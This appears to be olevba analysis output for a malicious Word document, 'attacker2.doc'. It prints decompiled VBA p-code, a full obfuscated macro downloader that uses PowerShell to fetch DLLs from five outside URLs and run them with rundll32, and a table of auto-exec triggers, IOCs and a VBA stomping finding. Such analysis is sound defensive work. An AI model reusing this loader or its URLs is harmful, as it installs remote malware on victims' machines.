' 	LitDI2 0x0001 
' 	Ld IsEmail 
' 	FnLen 
' 	For 
' Line #26:
' 	Ld IsEmail 
' 	Ld Email 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St w 
' Line #27:
' 	Ld w 
' 	ArgsLd Split$ 0x0001 
' 	LitStr 0x0005 "[a-z]"
' 	Like 
' 	Ld w 
' 	LitStr 0x0001 "@"
' 	Eq 
' 	Or 
' 	Ld w 
' 	LitStr 0x0001 "."
' 	Eq 
' 	Or 
' 	Ld w 
' 	LitStr 0x0001 "-"
' 	Eq 
' 	Or 
' 	Ld w 
' 	LitStr 0x0001 "_"
' 	Eq 
' 	Or 
' 	Ld w 
' 	ArgsLd LCase 0x0001 
' 	Or 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #28:
' 	ExitFunc 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	StartForVariable 
' 	Ld Email 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' Line #32:
' 	Ld IsEmail 
' 	ArgsLd UCase$ 0x0001 
' 	ArgsLd IsNumeric$ 0x0001 
' 	LitStr 0x0001 "."
' 	ArgsLd sSplit 0x0002 
' 	St sLetra 
' Line #33:
' Line #34:
' 	Ld vbPicTypeIcon 
' 	Ld sLetra 
' 	FnUBound 0x0000 
' 	ArgsLd sLetra 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	ExitFunc 
' Line #36:
' 	EndIfBlock 
' Line #37:
' Line #38:
' 	LitVarSpecial (True)
' 	St Dominios 
' Line #39:
' 	EndIfBlock 
' Line #40:
' Line #41:
' 	OnError (GoTo 0) 
' Line #42:
' Line #43:
' 	EndFunc 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'attacker2.doc' - OLE stream: 'Macros/Form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Dim WAITPLZ, WS
WAITPLZ = DateAdd(Chr(115), 4, Now())
Do Until (Now() > WAITPLZ)
Loop

LL1 = "$Nano='JOOEX'.replace('JOO','I');sal OY $Nano;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://priyacareers.com/u9hDQN9Yy7g/pt.html'',''C:\ProgramData\www1.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"

LL2 = "$Nanoz='JOOEX'.replace('JOO','I');sal OY $Nanoz;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://perfectdemos.com/Gv1iNAuMKZ/pt.html'',''C:\ProgramData\www2.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"

LL3 = "$Nanox='JOOEX'.replace('JOO','I');sal OY $Nanox;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://bussiness-z.ml/ze8pCNTIkrIS/pt.html'',''C:\ProgramData\www3.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"

LL4 = "$Nanoc='JOOEX'.replace('JOO','I');sal OY $Nanoc;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://cablingpoint.com/ByH5NDoE3kQA/pt.html'',''C:\ProgramData\www4.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"

LL5 = "$Nanoc='JOOEX'.replace('JOO','I');sal OY $Nanoc;$aa='(New-Ob'; $qq='ject Ne'; $ww='t.WebCli'; $ee='ent).Downl'; $rr='oadFile'; $bb='(''https://bonus.corporatebusinessmachines.co.in/1Y0qVNce/pt.html'',''C:\ProgramData\www5.dll'')';$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join ''); OY $FOOX|OY;"


HH9="po"
HH8="wers"
HH7="h"
HH6="ell "
HH0= HH9+HH8+HH7+HH6 #powershell
Set Ran = CreateObject("wscript.shell")
Ran.Run HH0+LL1,Chr(48)
Ran.Run HH0+LL2,Chr(48)
Ran.Run HH0+LL3,Chr(48)
Ran.Run HH0+LL4,Chr(48)
Ran.Run HH0+LL5,Chr(48)
WScript.Sleep(15000)
OK1 = "cmd /c rundll32.exe C:\ProgramData\www1.dll,ldr"
Ran.Run OK1, Chr(48)
OK2 = "cmd /c rundll32.exe C:\ProgramData\www2.dll,ldr"
Ran.Run OK2, Chr(48)
OK3 = "cmd /c rundll32.exe C:\ProgramData\www3.dll,ldr"
Ran.Run OK3, Chr(48)
OK4 = "cmd /c rundll32.exe C:\ProgramData\www4.dll,ldr"
Ran.Run OK4, Chr(48)
OK5 = "cmd /c rundll32.exe C:\ProgramData\www5.dll,ldr"
Ran.Run OK5, Chr(48)
W)



-------------------------------------------------------------------------------
VBA FORM Variable "b't2'" IN 'attacker2.doc' - OLE stream: 'Macros/Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://priyacareers|URL                                          |
|          |.com/u9hDQN9Yy7g/pt.|                                             |
|          |html'',''C          |                                             |
|IOC       |https://perfectdemos|URL                                          |
|          |.com/Gv1iNAuMKZ/pt.h|                                             |
|          |tml'',''C           |                                             |
|IOC       |https://bussiness-z.|URL                                          |
|          |ml/ze8pCNTIkrIS/pt.h|                                             |
|          |tml'',''C           |                                             |
|IOC       |https://cablingpoint|URL                                          |
|          |.com/ByH5NDoE3kQA/pt|                                             |
|          |.html'',''C         |                                             |
|IOC       |https://bonus.corpor|URL                                          |
|          |atebusinessmachines.|                                             |
|          |co.in/1Y0qVNce/pt.ht|                                             |
|          |ml'',''C            |                                             |
|IOC       |www1.dll            |Executable file name                         |
|IOC       |www2.dll            |Executable file name                         |
|IOC       |www3.dll            |Executable file name                         |
|IOC       |www4.dll            |Executable file name                         |
|IOC       |www5.dll            |Executable file name                         |
|IOC       |rundll32.exe        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
